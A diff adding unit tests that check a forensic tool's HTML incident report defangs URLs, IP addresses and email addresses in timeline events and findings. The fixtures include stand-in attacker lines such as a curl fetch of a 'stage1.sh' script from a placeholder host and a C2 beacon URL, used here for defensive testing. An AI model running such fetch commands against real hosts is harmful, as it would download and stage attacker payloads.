@@ -359,3 +359,80 @@ describe("renderInteractiveHtmlReport", () => {
     expect(html).toContain("Acme DFIR");
   });
 });
+
+// This file IS the deliverable — it exists to be emailed out of the analyst's org, and the saved
+// copy opens from file:// with no CSP. Live attacker URLs, IPs and email addresses have no business
+// travelling in it, the same standard the Markdown/HTML/DOCX reports already hold to. #892.
+describe("renderInteractiveHtmlReport indicator defanging (#892)", () => {
+  function withEvent(description: string, over: Record<string, unknown> = {}) {
+    const state = emptyState("c1");
+    state.forensicTimeline.push({ ...ev("e1", "High"), description, ...over });
+    return parseBlob(renderInteractiveHtmlReport(state, caseMeta, emptyReportMeta()));
+  }
+
+  it("defangs URLs, IPv4 addresses and email addresses in event descriptions", () => {
+    const blob = withEvent("curl http://evil.example/stage1.sh from 203.0.113.10, mailed by a@b.example");
+
+    expect(blob.timeline[0].description).toBe(
+      "curl hxxp://evil[.]example/stage1.sh from 203[.]0[.]113[.]10, mailed by a[@]b[.]example",
+    );
+  });
+
+  it("defangs finding prose — title, description and confidence reason", () => {
+    const state = emptyState("c1");
+    state.findings.push({
+      ...finding("f1", "High", 80, "Beacon to http://evil.example/c2"),
+      description: "Host contacted 203.0.113.10",
+      confidenceReason: "Single source: www.evil.com",
+    });
+    const blob = parseBlob(renderInteractiveHtmlReport(state, caseMeta, emptyReportMeta()));
+
+    expect(blob.findings[0].title).toBe("Beacon to hxxp://evil[.]example/c2");
+    expect(blob.findings[0].description).toBe("Host contacted 203[.]0[.]113[.]10");
+    expect(blob.findings[0].confidenceReason).toBe("Single source: www[.]evil[.]com");
+  });
+
+  it("defangs a bare hostname the case records as a domain IOC, and guesses no further", () => {
+    // The domain allow-list is what separates an attacker hostname from the filenames a forensic
+    // report is full of — `vitest.config.ts` has the shape of a domain with a two-letter TLD.
+    const state = emptyState("c1");
+    state.iocs.push({
+      id: "i001",
+      type: "domain",
+      value: "evil.test",
+      firstSeen: "2026-05-01T00:00:00Z",
+    });
+    state.forensicTimeline.push({
+      ...ev("e1", "High"),
+      description: "callback to evil.test after dropping vitest.config.ts",
+    });
+    const blob = parseBlob(renderInteractiveHtmlReport(state, caseMeta, emptyReportMeta()));
+
+    expect(blob.timeline[0].description).toBe("callback to evil[.]test after dropping vitest.config.ts");
+  });
+
+  it("leaves asset, sources and artifactName alone — the page filters and searches on them", () => {
+    // The Host and Source <option> lists are built from these, and all three feed the client-side
+    // search haystack. Rewriting a hostname here would change the values an analyst picks from and
+    // silently break host search, for no gain: they are never URLs and are never linkified.
+    const blob = withEvent("beacon out", {
+      asset: "WIN-01.corp.example",
+      sources: ["velociraptor.corp.example"],
+      artifactName: "Windows.EventLogs.Evtx",
+    });
+
+    expect(blob.timeline[0].asset).toBe("WIN-01.corp.example");
+    expect(blob.timeline[0].sources).toEqual(["velociraptor.corp.example"]);
+    expect(blob.timeline[0].artifactName).toBe("Windows.EventLogs.Evtx");
+  });
+
+  it("leaves no live scheme anywhere in the rendered file", () => {
+    const state = emptyState("c1");
+    state.forensicTimeline.push({ ...ev("e1", "High"), description: "GET http://203.0.113.10/a.sh" });
+    state.findings.push({ ...finding("f1", "High", 80), description: "staged from https://evil.example/x" });
+    const html = renderInteractiveHtmlReport(state, caseMeta, emptyReportMeta());
+
+    expect(blobSource(html)).not.toMatch(/https?:\/\//);
+    expect(blobSource(html)).toContain("hxxp://203[.]0[.]113[.]10/a.sh");
+  });
+});
